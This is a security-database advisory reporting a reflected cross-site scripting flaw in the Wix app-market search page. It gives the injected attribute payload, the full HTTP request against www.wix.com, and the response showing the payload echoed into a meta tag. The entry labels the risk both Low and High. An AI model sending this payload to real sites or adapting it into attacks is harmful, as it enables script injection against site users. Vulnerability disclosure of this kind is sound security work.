---
title: WIX.com / market app Cross-site scripting (reflected)
url: https://cxsecurity.com/issue/WLB-2025080021
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-08-29
fetch_date: 2025-10-07T00:13:40.657561
---

# WIX.com / market app Cross-site scripting (reflected)

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **WIX.com / market app Cross-site scripting (reflected)** **2025.08.28**  Credit:  **[nu11secur1ty](https://cxsecurity.com/author/nu11secur1ty/1/)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

## Titles: WIX.com / market app Cross-site scripting (reflected)
## Author: nu11secur1ty
## Date: 8/27/2024
## Vendor: https://www.wix.com/
## Software: https://www.wix.com/market
## Reference: https://portswigger.net/web-security/cross-site-scripting
## Description:
The value of the query request parameter is copied into the value of an HTML tag attribute which is encapsulated in double quotation marks. The payload eq7ab"accesskey="x"onclick="document.location=1"//qkbzd was submitted in the query parameter. This input was echoed unmodified in the application's response.
STATUS: HIGH- Vulnerability
[+]PoC:
```
GET /app-market/search-result?query=eq7ab%22accesskey%3d%22x%22onclick%3d%22document.location%3d1%22%2f%2fqkbzd HTTP/1.1
Host: www.wix.com
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="139", "Not;A=Brand";v="24", "Google Chrome";v="139"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Upgrade-Insecure-Requests: 1
Content-Length: 0
```
[+]Response:
```
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Set-Cookie: XSRF-TOKEN=1755591144|Eg7emUWwe-IA; Domain=.wix.com; Path=/; Secure; SameSite=Lax
Set-Cookie: \_wixAB3=3477653#1; Max-Age=15724800; Expires=Tue, 17 Feb 2026 08:12:24 GMT; Path=/app-market/search-result; Domain=.wix.com
Etag: W/"280f9-gSC7iOcPNDT2CRThSwJyIPL8Re8"
Pragma: no-cache
Cache-Control: no-store, no-cache
X-Wix-Request-Id: 1755591144.079172597310943348307
X-Wix-Request-Id: 1755591144.079172597310943348307
Strict-Transport-Security: max-age=31536000
Server: Pepyaka
X-Content-Type-Options: nosniff
Accept-Ranges: bytes
Date: Tue, 19 Aug 2025 08:12:25 GMT
X-Served-By: cache-mxp6959-MXP
X-Cache: MISS
Vary: Accept-Encoding
X-Seen-By: yvSunuo/8ld62ehjr5B7kA==,GilIRCy+Ky2nI9KZaDKzWLxkNjrXdwdgtu6E0yACibU=,yI4PPEXc3bvXNWfpzSkUarxkNjrXdwdgtu6E0yACibU=,m0j2EEknGIVUW/liY8BLLhltI8UMiPPDOVwaTrPHXCH8v8cBhCntPM7PcrIAnRiP,jdDt270t0fniy2BugWKBrcczmKBTV50ZIhnFmHyHs57I9wpXHBT6h1wfBN9ClwxEB2liM03bnUiF6lTGavdqtA==,TeEjV9lv7/HACQr2VMOeGw2Glp1kLqnecer2BlKK+IU=,b61bb5l8iKStMCYyOHGHzRnQM7J/rJ7uPqCFTHO1XctorBYDGeK3UgGvWP2Td4iX2A0xrElz8K0jvAxA68GNHA==,PD4YJOeir0FhY6Fl90bUjyPr+onDcVcE7HwIMshK4tA=,mvxQ9qSAmY38asKjFCcmG9fqwOC4CaktraAMWrC0uVj1OAazU43d/JllZoi5V6gBMOqF25aPBecVfgGQEnEHcw==
Via: 1.1 google
Glb-X-Seen-By: bS8wRlGzu0Hc+WrYuHB8QIg44yfcdCMJRkBoQ1h6Vjc=
Alt-Svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
<!doctype html>
<html>
<head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8" />
<meta http-equiv="content-language" content='en' />
<title data-meta-tags-aggr
...[SNIP]...
<meta data-meta-tags-aggregator="true" property="og:title" content="You searched for eq7ab"accesskey="x"onclick="document.location=1"//qkbzd | Wix App Market" />
...[SNIP]...
```
## Reproduce:
[href](https://www.patreon.com/posts/wix-com-xss-136830597)
## Demo PoC:
[href](https://www.patreon.com/posts/wix-com-xss-136830597)
## Time spent:
03:27:00
--
System Administrator - Infrastructure Engineer
Penetration Testing Engineer
Exploit developer at https://packetstormsecurity.com/ https://cve.mitre.org/index.html
https://cxsecurity.com/ and https://www.exploit-db.com/
0day Exploit DataBase https://0day.today/
home page: https://www.nu11secur1ty.com/
hiPEnIMR0v7QCo/+SEH9gBclAAYWGnPoBIQ75sCj60E=
nu11secur1ty <http://nu11secur1ty.com/>

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025080021)

[Tweet](https://twitter.com/share)

Vote for this issue:
 2
 0

100%

0%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top